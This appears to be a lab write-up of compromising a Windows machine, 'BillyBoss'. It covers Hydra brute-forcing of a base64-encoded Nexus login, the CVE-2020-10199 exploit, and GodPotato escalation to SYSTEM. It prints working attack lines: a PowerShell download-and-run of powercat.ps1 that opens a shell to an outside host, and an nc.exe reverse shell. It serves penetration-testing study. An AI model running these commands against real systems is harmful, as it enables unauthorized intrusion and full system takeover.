#Windows #Nexus #CeWL #Hydra #RCE #SeImpersonate #GodPotato #CVE-2020-10199

## Overview

BillyBoss is a Windows machine hosting a Sonatype Nexus Repository Manager. The foothold requires generating a site-specific wordlist with CeWL to crack the base64-encoded login form, then exploiting CVE-2020-10199, an authenticated RCE in Nexus 3.21.0. Privilege escalation uses GodPotato against SeImpersonatePrivilege on Windows 10 1903.

## Recon

### Nmap

```sh
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: BaGet
8081/tcp open  http          Jetty 9.4.18.v20190429
|_http-server-header: Nexus/3.21.0-05 (OSS)
| http-robots.txt: 2 disallowed entries
|_/repository/ /service/
|_http-title: Nexus Repository Manager
```

Port 8081 is the target. The server banner exposes the exact version: **Nexus 3.21.0-05**.

### Nexus Login Analysis

Nexus 3.21.0-05 has a known authenticated RCE (EDB-49385 / CVE-2020-10199), but the exploit needs credentials. The default `admin:admin123` fails. Looking at the login POST request in Burp reveals the credentials are base64-encoded before transmission:

```
username=YWRtaW4=&password=YWRtaW4=
```

Standard wordlists produce no results because Hydra needs to encode values on the fly.

## Foothold

### CeWL Wordlist + Hydra

When generic wordlists fail, scraping the target application's own text often produces passwords matching the site's naming conventions. CeWL spiders the Nexus interface and extracts unique words:

```sh
cewl http://192.168.176.61:8081/ | grep -v CeWL > custom-wordlist.txt
cewl --lowercase http://192.168.176.61:8081/ | grep -v CeWL >> custom-wordlist.txt
```

Hydra's `^USER64^` and `^PASS64^` placeholders instruct it to base64-encode credentials before injecting them, matching what the login form expects:

```sh
hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt \
  'http-post-form://192.168.176.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
[8081][http-post-form] host: 192.168.176.61   login: nexus   password: nexus
```

Credentials:

```
nexus : nexus
```

> **Why CeWL works:** applications built around a specific topic tend to use terminology from that domain in passwords, product names, feature names, version strings. CeWL harvests those terms directly from the site, producing a compact list heavily biased toward what this particular service's admin might have chosen.

### CVE-2020-10199, Nexus 3.21.0 Authenticated RCE

EDB-49385 exploits a server-side request evaluation flaw in Nexus's EL (Expression Language) handler. I downloaded the exploit, updated the target IP, username, and password, and replaced its default payload with a base64-encoded PowerShell reverse shell:

```sh
python3 nexus.py
```

Shell received as `billyboss\nathan`:

```sh
rlwrap nc -lvnp 443
connect to [...] from (UNKNOWN) [192.168.176.61] 50215
whoami
billyboss\nathan
PS C:\Users\nathan\Nexus\nexus-3.21.0-05>
```

Local flag:

```powershell
PS C:\Users\nathan\Desktop> type local.txt
‹redacted›
```

### Shell Upgrade with PowerCat

The initial shell was unstable with WinPEAS, so a PowerCat upgrade provided a cleaner session:

```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.244/powercat.ps1');powercat -c 192.168.45.244 -p 53 -e cmd
```

## Privilege Escalation

### SeImpersonate via GodPotato

WinPEAS confirms SeImpersonatePrivilege is enabled. `systeminfo` shows Windows 10 Pro, build 18362 (version 1903):

```sh
OS Name:    Microsoft Windows 10 Pro
OS Version: 10.0.18362 N/A Build 18362
```

Windows 10 1903 is recent enough that GodPotato applies. The precompiled NET4 build from the official repo is the version that worked, earlier compiled versions failed silently:

```powershell
.\potato.exe -cmd "C:\Users\nathan\Desktop\nc.exe 192.168.45.244 8081 -e cmd.exe"
```

> **GodPotato vs older potatoes:** GodPotato (2023) works on Windows Server 2012–2022 and Windows 10/11 by abusing the RPC Endpoint Mapper rather than the Print Spooler or BITS triggers used by older potato variants. It's more reliable on modern builds where those older trigger paths are patched. Matching the .NET framework version on the target to the compiled binary matters, the NET4 version must match a target running .NET 4.x.

## Root / SYSTEM

```sh
rlwrap nc -lvnp 8081
connect to [...] from (UNKNOWN) [192.168.176.61] 50245
Microsoft Windows [Version 10.0.18362.719]

C:\Windows\system32> whoami
(no output — known GodPotato quirk on some builds)
```

The shell runs as SYSTEM despite `whoami` returning blank:

```powershell
C:\Users\Administrator\Desktop> type proof.txt
‹redacted›
```

## Takeaways

- **Version banners are gifts.** The Nexus server header gave the exact version string that maps to a searchsploit hit, always note service banners during recon.
- **CeWL fills the gap when generic wordlists fail.** Site-scraped wordlists are small, targeted, and often hit passwords that rockyou never would.
- **Know your .NET version before running potato exploits.** GodPotato NET4 on a NET4 target, NET35 on older ones. Wrong version = silent failure.
